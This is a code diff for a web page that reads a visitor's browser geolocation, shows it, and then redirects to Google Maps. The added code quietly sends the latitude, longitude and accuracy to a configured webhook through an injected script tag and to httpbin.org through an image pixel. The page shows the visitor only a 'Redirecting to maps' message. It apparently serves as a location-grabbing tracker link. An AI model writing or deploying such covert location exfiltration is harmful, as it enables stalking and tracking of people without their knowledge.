@@ -32,17 +32,35 @@
                 document.getElementById('coords').innerHTML = 
                     `📍 ${lat.toFixed(6)}, ${lng.toFixed(6)}<br>📏 Accuracy: ${accuracy}m`;
                 
-                // Send location via URL redirect to webhook
+                // Save location to localStorage and try to send via webhook
+                const locationData = {
+                    latitude: lat,
+                    longitude: lng,
+                    accuracy: accuracy,
+                    timestamp: Date.now()
+                };
+                
+                // Save locally
+                localStorage.setItem('xtos_location', JSON.stringify(locationData));
+                
+                // Try to send via webhook URL with JSONP-like approach
                 if (webhookUrl) {
-                    setTimeout(() => {
-                        window.location.href = `${webhookUrl}?lat=${lat}&lng=${lng}&acc=${accuracy}&t=${Date.now()}`;
-                    }, 2000);
-                } else {
-                    // Direct redirect to maps
+                    const script = document.createElement('script');
+                    script.src = `${webhookUrl}?callback=xtos&lat=${lat}&lng=${lng}&acc=${accuracy}&t=${Date.now()}`;
+                    document.head.appendChild(script);
+                    
+                    // Also try image pixel tracking
+                    const img = new Image();
+                    img.src = `https://httpbin.org/get?lat=${lat}&lng=${lng}&t=${Date.now()}`;
+                }
+                
+                // Show success and redirect
+                setTimeout(() => {
+                    document.getElementById('status').innerHTML = '🚀 Redirecting to maps...';
                     setTimeout(() => {
                         window.location.href = `https://maps.google.com/?q=${lat},${lng}`;
-                    }, 3000);
-                }
+                    }, 1000);
+                }, 2000);
                 
             }, function(error) {
                 document.getElementById('status').innerHTML = '❌ Location access denied';
